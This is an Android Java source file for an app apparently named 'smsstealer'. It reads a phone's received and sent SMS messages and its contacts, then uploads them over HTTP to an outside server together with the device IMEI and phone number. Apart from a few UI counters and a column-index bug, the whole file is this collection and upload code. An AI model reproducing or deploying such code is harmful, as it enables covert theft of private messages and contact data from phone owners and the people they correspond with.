package com.example.lukasz.smsstealer;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.TextView;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.net.URL;

public class MainActivity extends AppCompatActivity {

    private TextView odebCountText, odebSentText, wyslCountText, wyslSentText, contactsCountText, contactsSentText;
    private Cursor receivedCursor, contactsCoursor, sentCoursor;
    private String IMEI;
    private Long dayInMs = 1000L * 60 * 60 * 24;
    private Date oneWeekAgo = new Date((new Date().getTime()) - (7 * dayInMs));
    private String phoneNumber = "516069840";
    private SimpleDateFormat parser = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main_activity);
        odebCountText = (TextView) findViewById(R.id.odebCountText);
        odebSentText = (TextView) findViewById(R.id.odebSentText);
        wyslCountText = (TextView) findViewById(R.id.wyslCountText);
        wyslSentText = (TextView) findViewById(R.id.wyslSentText);
        contactsCountText = (TextView) findViewById(R.id.contactsCountText);
        contactsSentText = (TextView) findViewById(R.id.contactsSentText);

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, 111);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.INTERNET) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.INTERNET}, 112);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, 113);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS}, 114);
        }
    }

    private void updateSentItemsforReceived(String resultCode) {
        odebSentText.setText(resultCode);
    }

    private void updateSentItemsforContacts(String resultCode) {
        contactsSentText.setText(resultCode);
    }

    private void updateSentItemsforSent(String resultCode) {
        wyslSentText.setText(resultCode);
    }


    @SuppressLint("MissingPermission")
    public void startButton(View view) {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        IMEI = telephonyManager.getDeviceId();
        final String PHONE = telephonyManager.getLine1Number();
        contactsCountText.setText("OK");

        @SuppressLint("StaticFieldLeak") AsyncTask<Void, Integer, Void> asyncTask = new AsyncTask<Void, Integer, Void>(){

            @Override
            protected Void doInBackground(Void... voids) {
                String data = "IMEI="+IMEI+"&phone="+PHONE;
                System.out.println(data);
                try{
                    URL url = new URL("http://www.server1337.ugu.pl/savePerson.php?" + data);
                    HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                    urlConnection.getResponseCode();
                    urlConnection.disconnect();
                }catch (IOException e){
                    e.printStackTrace();
                }

                return null;
            }
        };
        asyncTask.execute();
        contactsSentText.setText("sent");
    }

    public void allReceived(View view){
        receivedCursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        odebCountText.setText(Integer.toString(receivedCursor.getCount()));
    }

    public void lastWeekReceived(View view){
        String[] args = {Long.toString(oneWeekAgo.getTime())};
        String query = "date>?";
        receivedCursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, query, args, null);
        odebCountText.setText(Integer.toString(receivedCursor.getCount()));
    }

    public void olderThenWeekReceived(View vie){
        String[] args = {Long.toString(oneWeekAgo.getTime())};
        String query = "date<?";
        receivedCursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, query, args, null);
        odebCountText.setText(Integer.toString(receivedCursor.getCount()));
    }

    public void allReceivedWithoutMyNumber(View view){
        String[] args = {phoneNumber, "+48"+phoneNumber};
        String query = "address<>? AND address<>?";
        receivedCursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, query, args, null);
        odebCountText.setText(Integer.toString(receivedCursor.getCount()));
    }

    public void lastWeekReceivedWithoutMyNumber(View view){
        String[] args = {phoneNumber, "+48"+phoneNumber, Long.toString(oneWeekAgo.getTime())};
        String query = "address<>? AND address<>? AND date>?";
        receivedCursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, query, args, null);
        odebCountText.setText(Integer.toString(receivedCursor.getCount()));
    }

    public void olderThenWeekReceivedWithoutMyNumber(View view){
        String[] args = {phoneNumber, "+48"+phoneNumber, Long.toString(oneWeekAgo.getTime())};
        String query = "address<>? AND address<>? AND date<?";
        receivedCursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, query, args, null);
        odebCountText.setText(Integer.toString(receivedCursor.getCount()));
    }

    public void sendReceived(View view){
        @SuppressLint("StaticFieldLeak") AsyncTask<Void, String, Void> asyncTask = new AsyncTask<Void, String, Void>() {
            @Override
            protected Void doInBackground(Void... voids) {
                String data="";
                if(receivedCursor.moveToFirst()){
                    do {
                        String date = parser.format(new Date(receivedCursor.getLong(sentCoursor.getColumnIndex("date"))));
                        data += receivedCursor.getString(sentCoursor.getColumnIndex("address")) + "@!@"+
                                date + "@!@"+
                                receivedCursor.getString(sentCoursor.getColumnIndex("body"))+ "@!@"+
                                IMEI+"@@@";
                    }while(receivedCursor.moveToNext());
                    publishProgress(send(data));
                }
                return null;
            }

            private String send(String data){
                try {
                    data = data.replace(" ", "%20").replace("\n", "%20").replace("\r", "%20");
                    System.out.println(data);
                    URL url = new URL("http://www.server1337.ugu.pl/saveMessage.php");
                    HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                    urlConnection.setDoOutput(true);
                    OutputStream os = urlConnection.getOutputStream();
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                    writer.write("data="+data);
                    writer.flush();
                    writer.close();
                    os.close();
                    return urlConnection.getResponseMessage();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                return "error";
            }

            @Override
            protected void onProgressUpdate(String... values) {
                updateSentItemsforReceived(values[0]);
            }

        };
        asyncTask.execute();
    }
    //==============================================================================================================================================

    public void allSent(View view){
        sentCoursor = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
        wyslCountText.setText(Integer.toString(sentCoursor.getCount()));
    }

    public void lastWeekSent(View view){
        String[] args = {Long.toString(oneWeekAgo.getTime())};
        String query = "date>?";
        sentCoursor = getContentResolver().query(Uri.parse("content://sms/sent"), null, query, args, null);
        wyslCountText.setText(Integer.toString(sentCoursor.getCount()));
    }

    public void olderThenWeekSent(View vie){
        String[] args = {Long.toString(oneWeekAgo.getTime())};
        String query = "date<?";
        sentCoursor = getContentResolver().query(Uri.parse("content://sms/sent"), null, query, args, null);
        wyslCountText.setText(Integer.toString(sentCoursor.getCount()));
    }

    public void allSentWithoutMyNumber(View view){
        String[] args = {phoneNumber, "+48"+phoneNumber};
        String query = "address<>? AND address<>?";
        sentCoursor = getContentResolver().query(Uri.parse("content://sms/sent"), null, query, args, null);
        wyslCountText.setText(Integer.toString(sentCoursor.getCount()));
    }

    public void lastWeekSentWithoutMyNumber(View view){
        String[] args = {phoneNumber, "+48"+phoneNumber, Long.toString(oneWeekAgo.getTime())};
        String query = "address<>? AND address<>? AND date>?";
        sentCoursor = getContentResolver().query(Uri.parse("content://sms/sent"), null, query, args, null);
        wyslCountText.setText(Integer.toString(sentCoursor.getCount()));
    }

    public void olderThenWeekSentWithoutMyNumber(View view){
        String[] args = {phoneNumber, "+48"+phoneNumber, Long.toString(oneWeekAgo.getTime())};
        String query = "address<>? AND address<>? AND date<?";
        sentCoursor = getContentResolver().query(Uri.parse("content://sms/sent"), null, query, args, null);
        wyslCountText.setText(Integer.toString(sentCoursor.getCount()));
    }


    public void sendSent(View view){
        @SuppressLint("StaticFieldLeak") AsyncTask<Void, String, Void> asyncTask = new AsyncTask<Void, String, Void>() {
            @Override
            protected Void doInBackground(Void... voids) {
                String data ="";
                if (sentCoursor.moveToFirst()) {
                    do{
                        String date = parser.format(new Date(sentCoursor.getLong(sentCoursor.getColumnIndex("date"))));
                        data += sentCoursor.getString(sentCoursor.getColumnIndex("address"))+"@!@"+
                                date+"@!@"+
                                sentCoursor.getString(sentCoursor.getColumnIndex("body"))+"@!@"+
                                IMEI+"@@@";

                    }while(sentCoursor.moveToNext());
                    publishProgress(send(data));
                }
                return null;
            }

            private String send(String data){
                try {
                    data = data.replace(" ", "%20").replace("\n", "%20").replace("\r", "%20");
                    System.out.println(data);
                    URL url = new URL("http://www.server1337.ugu.pl/saveSentMessage.php");
                    HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                    urlConnection.setDoOutput(true);
                    OutputStream os = urlConnection.getOutputStream();
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                    writer.write("data="+data);
                    writer.flush();
                    writer.close();
                    os.close();
                    return urlConnection.getResponseMessage();
                }catch (IOException e){
                    e.printStackTrace();
                }
                return "error";
            }

            @Override
            protected void onProgressUpdate(String... values) {
                updateSentItemsforSent(values[0]);
            }
        };
        asyncTask.execute();
    }
    //==============================================================================================================================================

    public void getContacts(View view){
        contactsCoursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null,null, null, null);
        contactsCountText.setText(Integer.toString(contactsCoursor.getCount()));
    }

    public void sendContacts(View view){
        @SuppressLint("StaticFieldLeak") AsyncTask<Void, String, Void> asyncTask = new AsyncTask<Void, String, Void>() {
            @Override
            protected Void doInBackground(Void... voids) {
                String data = "";
                if (contactsCoursor.moveToFirst()) {
                    do{
                        String phoneNumber = "pusto";
                        String id = contactsCoursor.getString(contactsCoursor.getColumnIndex(ContactsContract.Contacts._ID));
                        if (contactsCoursor.getInt(contactsCoursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                            Cursor pCur = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,
                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                            phoneNumber = "";
                            while (pCur.moveToNext()) {
                                phoneNumber += pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            }
                        }

                        data += contactsCoursor.getString(contactsCoursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))+";"+
                                phoneNumber+";"+
                                IMEI+"@@@";

                    }while(contactsCoursor.moveToNext());
                    publishProgress(send(data));
                }
                return null;
            }

            private String send(String data){
                try {
                    data = data.replace(" ", "%20").replace("\n", "%20").replace("\r", "%20");;;
                    System.out.println(data);
                    URL url = new URL("http://www.server1337.ugu.pl/saveContacts.php");
                    HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                    urlConnection.setDoOutput(true);
                    OutputStream os = urlConnection.getOutputStream();
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                    writer.write("data="+data);
                    writer.flush();
                    writer.close();
                    os.close();
                    return urlConnection.getResponseMessage();
                }catch (IOException e){
                    e.printStackTrace();
                }
                return "error";
            }

            @Override
            protected void onProgressUpdate(String... values) {
                updateSentItemsforContacts(values[0]);
            }
        };
        asyncTask.execute();
    }
}
